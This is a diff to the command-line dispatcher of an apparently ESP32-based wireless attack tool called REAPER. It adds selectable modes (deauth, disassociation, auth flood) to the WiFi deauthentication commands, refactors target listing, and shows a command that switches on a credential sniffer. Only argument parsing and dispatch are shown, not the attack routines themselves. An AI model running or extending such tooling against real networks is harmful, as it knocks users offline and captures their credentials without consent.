@@ -1,10 +1,6 @@
 /*
  * ============================================================================
  *  cli_module.c  —  Unified command dispatcher for the REAPER CLI
- *
- *  This file contains ONLY command parsing and dispatch logic.
- *  Transport I/O is handled by cli_transport.c/h, which abstracts UART0
- *  and CDC-ACM behind a common vtable.
  * ============================================================================
  */
 
@@ -25,8 +21,10 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <inttypes.h>
+
 #include "esp_system.h"
 #include "esp_timer.h"
+
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 
@@ -70,8 +68,8 @@ static void cli_print_help(void)
     t->printf("  adv start [seconds] [name]\n");
     t->printf("  adv stop\n");
     t->printf("\n");
-    t->printf("  deauth ap <bssid> [count]\n");
-    t->printf("  deauth client <bssid> <client> [count]\n");
+    t->printf("  deauth ap <bssid> [count] [mode]\n");
+    t->printf("  deauth client <bssid> <client> [count] [mode]\n");
     t->printf("  deauth stop\n");
     t->printf("  deauth list\n");
     t->printf("\n");
@@ -111,6 +109,7 @@ void cli_dispatch_command(int argc, char *argv[])
         if (argc >= 2 && strcmp(argv[1], "status") == 0) {
             if (storage_is_ready()) {
                 if (t && t->printf) t->printf("SD card ready.\n");
+                /* Note: Ensure g_sd_card is extern in storage_sd.h */
                 sdmmc_card_print_info(stdout, g_sd_card);
             } else {
                 if (t && t->printf) t->printf("SD card not ready.\n");
@@ -218,8 +217,8 @@ void cli_dispatch_command(int argc, char *argv[])
         if (argc < 2) {
             if (t && t->printf) {
                 t->printf("Usage:\n");
-                t->printf("  deauth ap <bssid> [count=100]         - Deauth all clients on AP\n");
-                t->printf("  deauth client <bssid> <client> [count] - Deauth specific client\n");
+                t->printf("  deauth ap <bssid> [count=100] [mode]         - Deauth all clients on AP\n");
+                t->printf("  deauth client <bssid> <client> [count] [mode] - Deauth specific client\n");
                 t->printf("  deauth stop\n");
                 t->printf("  deauth list\n");
             }
@@ -237,7 +236,10 @@ void cli_dispatch_command(int argc, char *argv[])
                     else if (strcmp(argv[4], "auth") == 0) mode = DEAUTH_MODE_AUTH_FLOOD_ONLY;
                 }
                 deauth_remove_all();
-                deauth_attack_ap_all_clients(bssid, count, 0, mode);
+                
+                /* FIXED: Use add_target + start to support custom modes */
+                deauth_add_target(bssid, NULL, count, 0, mode);
+                deauth_start();
             }
         } else if (strcmp(argv[1], "client") == 0 && argc >= 4) {
             uint8_t bssid[6], client[6];
@@ -262,24 +264,24 @@ void cli_dispatch_command(int argc, char *argv[])
             deauth_stop();
             deauth_remove_all();
         } else if (strcmp(argv[1], "list") == 0) {
-            if (t && t->printf) t->printf("Deauth targets: %d\n", g_deauth_target_count);
-            for (int i = 0; i < g_deauth_target_count; i++) {
-                const char *mode_str = "auto";
-                switch (g_deauth_targets[i].mode) {
-                    case DEAUTH_MODE_DEAUTH_ONLY:    mode_str = "deauth"; break;
-                    case DEAUTH_MODE_DISASSOC_ONLY:  mode_str = "disassoc"; break;
-                    case DEAUTH_MODE_AUTH_FLOOD_ONLY: mode_str = "auth"; break;
-                    default: break;
+            /* FIXED: Use public API instead of static variables */
+            uint8_t count = deauth_get_target_count();
+            if (t && t->printf) t->printf("Deauth targets: %d\n", count);
+            
+            for (int i = 0; i < count; i++) {
+                deauth_target_t tgt;
+                if (deauth_get_target(i, &tgt) == ESP_OK) {
+                    const char *mode_str = "auto";
+                    switch (tgt.mode) {
+                        case DEAUTH_MODE_DEAUTH_ONLY:    mode_str = "deauth"; break;
+                        case DEAUTH_MODE_DISASSOC_ONLY:  mode_str = "disassoc"; break;
+                        case DEAUTH_MODE_AUTH_FLOOD_ONLY: mode_str = "auth"; break;
+                        default: break;
+                    }
+                    t->printf("  [%d] BSSID: " MACSTR " -> CLIENT: " MACSTR " [count=%" PRIu32 " mode=%s active=%d]\n",
+                              i, MAC2STR(tgt.bssid), MAC2STR(tgt.client_mac),
+                              tgt.count, mode_str, tgt.active);
                 }
-                t->printf("  [%d] BSSID: %02X:%02X:%02X:%02X:%02X:%02X -> CLIENT: %02X:%02X:%02X:%02X:%02X:%02X [count=%" PRIu32 " mode=%s active=%d]\n",
-                          i,
-                          g_deauth_targets[i].bssid[0], g_deauth_targets[i].bssid[1],
-                          g_deauth_targets[i].bssid[2], g_deauth_targets[i].bssid[3],
-                          g_deauth_targets[i].bssid[4], g_deauth_targets[i].bssid[5],
-                          g_deauth_targets[i].client_mac[0], g_deauth_targets[i].client_mac[1],
-                          g_deauth_targets[i].client_mac[2], g_deauth_targets[i].client_mac[3],
-                          g_deauth_targets[i].client_mac[4], g_deauth_targets[i].client_mac[5],
-                          g_deauth_targets[i].count, mode_str, g_deauth_targets[i].active);
             }
         } else {
             if (t && t->printf) t->printf("Unknown deauth command\n");
@@ -368,7 +370,8 @@ void cli_dispatch_command(int argc, char *argv[])
         if (argc < 2) {
             if (t && t->printf) t->printf("Usage: creds on|off|show|clear|save\n");
         } else if (strcmp(argv[1], "on") == 0) {
-            if (!atomic_load(&g_wifi_sniffer_active)) wifi_sniffer_start(0);
+            /* FIXED: Removed direct access to static g_wifi_sniffer_active */
+            wifi_sniffer_start(0); 
             creds_set_enabled(true);
             if (t && t->printf) t->printf("Credential sniffer ON\n");
         } else if (strcmp(argv[1], "off") == 0) {
